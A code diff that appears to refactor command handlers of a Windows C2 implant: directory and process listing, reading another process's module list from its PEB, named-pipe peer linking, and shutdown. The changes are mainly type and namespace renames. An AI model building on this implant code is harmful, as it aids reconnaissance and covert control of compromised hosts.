@@ -2,6 +2,7 @@
 using namespace Peers;
 using namespace Parser;
 using namespace Stream;
+using namespace Process;
 using namespace Dispatcher;
 
 namespace Commands {
@@ -17,10 +18,10 @@ namespace Commands {
         { .name = 0,				.address = nullptr		                        },
     };
 
-    VOID DirectoryList (_parser *parser) {
+    VOID DirectoryList (PARSER *parser) {
         HEXANE;
 
-        _stream *out = CreateTaskResponse(DIRECTORYLIST);
+        STREAM *out = CreateTaskResponse(DIRECTORYLIST);
 
         ULONG size      = 0;
         HANDLE handle   = nullptr;
@@ -95,10 +96,10 @@ namespace Commands {
         }
     }
 
-    VOID ProcessModules (_parser *parser) {
+    VOID ProcessModules (PARSER *parser) {
         HEXANE;
 
-        _stream *out = CreateTaskResponse(PROCESSMODULES);
+        STREAM *out = CreateTaskResponse(PROCESSMODULES);
 
         LDR_DATA_TABLE_ENTRY module     = { };
         PROCESS_BASIC_INFORMATION pbi   = { };
@@ -108,15 +109,15 @@ namespace Commands {
         PLIST_ENTRY entry           = nullptr;
         HANDLE process              = nullptr;
 
-        char modname_a[MAX_PATH]    = { };
-        wchar_t modname_w[MAX_PATH] = { };
+        CHAR modname_a[MAX_PATH]  = { };
+        WCHAR modname_w[MAX_PATH] = { };
 
-        uint32_t pid    = 0;
-        uint32_t count  = 0;
-        size_t size     = 0;
+        UINT32 pid    = 0;
+        UINT32 count  = 0;
+        SIZE_T size   = 0;
 
-        x_assert(pid = Process::GetProcessIdByName(UnpackString(parser, nullptr)));
-        x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
+        x_assert(pid = GetProcessIdByName(UnpackString(parser, nullptr)));
+        x_ntassert(NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
 
         x_ntassert(ctx->win32.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
         x_ntassert(ctx->win32.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size));
@@ -146,8 +147,7 @@ namespace Commands {
     VOID ProcessList() {
         HEXANE;
 
-        _stream *out = CreateTaskResponse(PROCESSLIST);
-
+        STREAM *out = CreateTaskResponse(PROCESSLIST);
         PROCESSENTRY32 entries = { };
 
         HANDLE snapshot             = nullptr;
@@ -224,7 +224,7 @@ namespace Commands {
         }
     }
 
-    VOID CommandAddPeer(_parser *parser) {
+    VOID CommandAddPeer(PARSER *parser) {
 
         auto pipe_name  = UnpackWString(parser, nullptr);
         auto peer_id    = UnpackUint32(parser);
@@ -232,13 +232,13 @@ namespace Commands {
         AddPeer(pipe_name, peer_id);
     }
 
-    VOID CommandRemovePeer(_parser *parser) {
+    VOID CommandRemovePeer(PARSER *parser) {
 
         auto peer_id = UnpackUint32(parser);
         RemovePeer(peer_id);
     }
 
-    VOID Shutdown (_parser *parser) {
+    VOID Shutdown (PARSER *parser) {
         HEXANE;
 
         // Send final message
@@ -248,9 +248,9 @@ namespace Commands {
     }
 
 
-    UINT_PTR FindCommandAddress(const uint32_t name_id) {
+    UINT_PTR FindCommandAddress(const uint32 name_id) {
 
-        for (uint32_t i = 0 ;; i++) {
+        for (uint32 i = 0 ;; i++) {
             if (!cmd_map[i].name) {
                 return 0;
             }
